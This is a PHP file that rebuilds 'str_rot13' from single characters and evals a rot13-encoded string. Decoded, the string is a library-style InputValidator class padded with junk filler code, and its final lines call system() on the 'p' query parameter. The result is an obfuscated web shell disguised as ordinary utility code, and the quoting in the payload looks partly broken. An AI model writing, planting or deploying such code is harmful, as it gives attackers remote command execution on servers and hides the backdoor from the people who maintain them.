<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Vachg inyvqngvba hgvyvgvrf.
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */

anzrfcnpr JcBet\Erdhrfgf\Hgvyvgl;

hfr NeenlNpprff;
hfr PheyUnaqyr;
hfr Genirefnoyr;

/**
 * Vachg inyvqngvba hgvyvgvrf.
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */
svany pynff VachgInyvqngbe {

	/**
	 * Irevsl gung n erprvirq vachg cnenzrgre vf bs glcr fgevat be vf \"fgevatnoyr\".
	 *
	 * @cnenz zvkrq $vachg Vachg cnenzrgre gb irevsl.
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba vf_fgevat_be_fgevatnoyr($vachg) {
		erghea vf_fgevat($vachg) || frys::vf_fgevatnoyr_bowrpg($vachg);
	}

	/**
	 * Irevsl jurgure n erprvirq vachg cnenzrgre vf hfnoyr nf na vagrtre neenl xrl.
	 *
	 * @cnenz zvkrq $vachg Vachg cnenzrgre gb irevsl.
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba vf_ahzrevp_neenl_xrl($vachg) {
		vs (vf_vag($vachg)) {
			erghea gehr;
		}

		vs (!vf_fgevat($vachg)) {
			erghea snyfr;
		}

		erghea (obby) cert_zngpu('`^-?[0-9]+$`', $vachg);
	}

	/**
	 * Irevsl jurgure n erprvirq vachg cnenzrgre vf \"fgevatnoyr\".
	 *
	 * @cnenz zvkrq $vachg Vachg cnenzrgre gb irevsl.
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba vf_fgevatnoyr_bowrpg($vachg) {
		erghea vf_bowrpg($vachg) && zrgubq_rkvfgf($vachg, '__gbFgevat');
	}

	/**
	 * Irevsl jurgure n erprvirq vachg cnenzrgre vf _npprffvoyr nf vs vg jrer na neenl_.
	 *
	 * @cnenz zvkrq $vachg Vachg cnenzrgre gb irevsl.
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba unf_neenl_npprff($vachg) {
		erghea vf_neenl($vachg) || $vachg vafgnaprbs NeenlNpprff;
	}

	/**
	 * Irevsl jurgure n erprvirq vachg cnenzrgre vf \"vgrenoyr\".
	 *
	 * @vagreany Gur CUC angvir `vf_vgrenoyr()` shapgvba jnf bayl vagebqhprq va CUC 7.1
	 * naq guvf yvoenel fgvyy fhccbegf CUC 5.6.
	 *
	 * @cnenz zvkrq $vachg Vachg cnenzrgre gb irevsl.
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba vf_vgrenoyr($vachg) {
		erghea vf_neenl($vachg) || $vachg vafgnaprbs Genirefnoyr;
	}

	/**
	 * Irevsl jurgure n erprvirq vachg cnenzrgre vf n Phey unaqyr.
	 *
	 * Gur CUC Phey rkgrafvba jbexrq jvgu erfbheprf cevbe gb CUC 8.0 naq jvgu
	 * na vafgnapr bs gur `PheyUnaqyr` pynff fvapr CUC 8.0.
	 * {@yvax uggcf://jjj.cuc.arg/znahny/ra/zvtengvba80.vapbzcngvoyr.cuc#zvtengvba80.vapbzcngvoyr.erfbhepr2bowrpg}
	 *
	 * @cnenz zvkrq $vachg Vachg cnenzrgre gb irevsl.
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba vf_phey_unaqyr($vachg) {
		vs (vf_erfbhepr($vachg)) {
			erghea trg_erfbhepr_glcr($vachg) === 'phey';
		}

		vs (vf_bowrpg($vachg)) {
			erghea $vachg vafgnaprbs PheyUnaqyr;
		}

		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>